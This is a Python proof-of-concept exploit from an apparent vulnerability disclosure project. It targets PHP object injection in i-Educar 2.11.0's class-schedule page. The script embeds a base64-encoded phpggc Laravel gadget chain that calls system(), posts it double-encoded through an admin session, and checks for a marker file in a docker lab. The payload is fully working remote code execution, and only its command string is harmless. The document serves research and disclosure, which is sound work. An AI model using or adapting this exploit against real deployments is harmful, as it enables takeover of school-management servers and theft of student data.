#!/usr/bin/env python3
"""VULN 08 — PHP object injection in educar_quadro_horario_horarios_cad.php.

The page runs `unserialize(urldecode($_POST['quadro_horario']))` on raw user
input. An authenticated user with access to the schedule form can smuggle a
serialized object graph that executes an OS command during request shutdown.

The PoC uses a precomputed gadget chain (phpggc `Laravel/RCE22`, author
mcdruid, verified against the installed Laravel 13.21.1):

  illuminate\\Broadcasting\\PendingBroadcast::__destruct()
    -> League\\CommonMark\\Environment\\Environment::dispatch($event)
    -> Illuminate\\Support\\Testing\\Fakes\\ChainedBatchTruthTest::__invoke($channel)
    -> call_user_func('system', (string) $channel)
    -> system('id > /tmp/poc08marker')

The serialized payload is embedded as base64 so the PoC stays stdlib-only and
does not need PHP or phpggc at run time.
"""

from __future__ import annotations

import base64
import subprocess
import sys
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli
from lib import lab as lab_mod  # noqa: E402

VULN = {
    "id": "08",
    "slug": "quadro-horario-object-injection",
    "title": "PHP object injection in educar_quadro_horario_horarios_cad.php",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-502",
    "cwe_name": "Deserialization of Untrusted Data",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/502.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The page calls unserialize() directly on POST data with no class allowlist, "
        "signature or integrity check: CWE-502. CWE-915 (mass assignment) and CWE-20 are "
        "not applicable; the sink is the deserializer itself."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cvss_score": 9.9,
    "endpoint": "POST /intranet/educar_quadro_horario_horarios_cad.php",
    "params": ["quadro_horario"],
    "precondition": "login with permission on process 641 (class schedule form; verified with admin)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/08-quadro-horario-object-injection-01-marker-proof.png",
    ],
    "advisory_url": "https://github.com/i-explorar/i-explorar/blob/main/vulns/08-quadro-horario-object-injection/README.md",
}

# phpggc Laravel/RCE22 for system('id > /tmp/poc08marker'), generated once:
PAYLOAD_B64 = (
    "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIA"
    "KgBldmVudHMiO086NDE6IkxlYWd1ZVxDb21tb25NYXJrXEVudmlyb25tZW50XEVudmlyb25tZW50"
    "IjoyOntzOjY0OiIATGVhZ3VlXENvbW1vbk1hcmtcRW52aXJvbm1lbnRcRW52aXJvbm1lbnQAZXh0"
    "ZW5zaW9uc0luaXRpYWxpemVkIjtiOjE7czo1NToiAExlYWd1ZVxDb21tb25NYXJrXEVudmlyb25t"
    "ZW50XEVudmlyb25tZW50AGxpc3RlbmVyRGF0YSI7TzozODoiTGVhZ3VlXENvbW1vbk1hcmtcVXRp"
    "bFxQcmlvcml0aXplZExpc3QiOjE6e3M6NDQ6IgBMZWFndWVcQ29tbW9uTWFya1xVdGlsXFByaW9y"
    "aXRpemVkTGlzdABsaXN0IjthOjE6e2k6MDthOjE6e2k6MDtPOjM2OiJMZWFndWVcQ29tbW9uTWFy"
    "a1xFdmVudFxMaXN0ZW5lckRhdGEiOjI6e3M6NDM6IgBMZWFndWVcQ29tbW9uTWFya1xFdmVudFxM"
    "aXN0ZW5lckRhdGEAZXZlbnQiO3M6MzI6IlxJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xDaGFubmVs"
    "IjtzOjQ2OiIATGVhZ3VlXENvbW1vbk1hcmtcRXZlbnRcTGlzdGVuZXJEYXRhAGxpc3RlbmVyIjtP"
    "OjU0OiJJbGx1bWluYXRlXFN1cHBvcnRcVGVzdGluZ1xGYWtlc1xDaGFpbmVkQmF0Y2hUcnV0aFRl"
    "c3QiOjE6e3M6MTE6IgAqAGNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fX19fX19czo4OiIAKgBldmVu"
    "dCI7TzozMToiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQ2hhbm5lbCI6MTp7czo0OiJuYW1lIjtz"
    "OjIxOiJpZCA+IC90bXAvcG9jMDhtYXJrZXIiO319Cg=="
)
PAYLOAD = base64.b64decode(PAYLOAD_B64)
MARKER = "/tmp/poc08marker"
FORM_URL = (
    "/intranet/educar_quadro_horario_horarios_cad.php"
    "?ref_cod_turma=3&ref_cod_quadro_horario=1&ref_cod_instituicao=1&ref_cod_escola=2"
    "&ref_cod_curso=3&ref_cod_serie=6&ano=2026&ref_cod_disciplina=3&dia_semana=1"
)
ADMIN = credentials.credentials("admin")


def _compose(lab: Path, *args: str) -> list[str]:
    return lab_mod.compose(lab, *args)


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    lab = lab_mod.lab_dir()
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")
    log.write(f"# payload: {len(PAYLOAD)} bytes (phpggc Laravel/RCE22, system('id > {MARKER}'))")

    client = http_util.HttpClient(target, verbose=verbose)
    client.login(*ADMIN)
    if not client.logged_in():
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "admin login failed"}

    subprocess.run(_compose(lab, "exec", "-T", "fpm", "rm", "-f", MARKER), cwd=lab,
                   capture_output=True, text=True, timeout=60)

    # The page runs urldecode() after PHP already decoded the form body, so the
    # value must be percent-encoded twice for the raw serialized string to reach
    # unserialize().
    encoded = urllib.parse.quote(urllib.parse.quote(PAYLOAD.decode("latin-1"), safe=""), safe="")
    response = client.post(FORM_URL, raw_data=f"quadro_horario={encoded}".encode())
    log.write("")
    log.write("### POST /intranet/educar_quadro_horario_horarios_cad.php")
    log.write(f"HTTP {response.status}")
    log.block("body head", response.text.strip()[:300])

    cat = subprocess.run(_compose(lab, "exec", "-T", "fpm", "cat", MARKER), cwd=lab,
                         capture_output=True, text=True, timeout=60)
    log.command(f"docker compose exec -T fpm cat {MARKER}")
    marker_content = (cat.stdout + cat.stderr).strip()
    log.block("marker output", marker_content or "(empty)")

    vulnerable = marker_content.startswith("uid=")
    notes.append(
        f"unserialize() gadget chain executed: {marker_content}"
        if vulnerable
        else "marker not created; chain did not execute"
    )

    subprocess.run(_compose(lab, "exec", "-T", "fpm", "rm", "-f", MARKER), cwd=lab,
                   capture_output=True, text=True, timeout=60)
    log.close()
    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
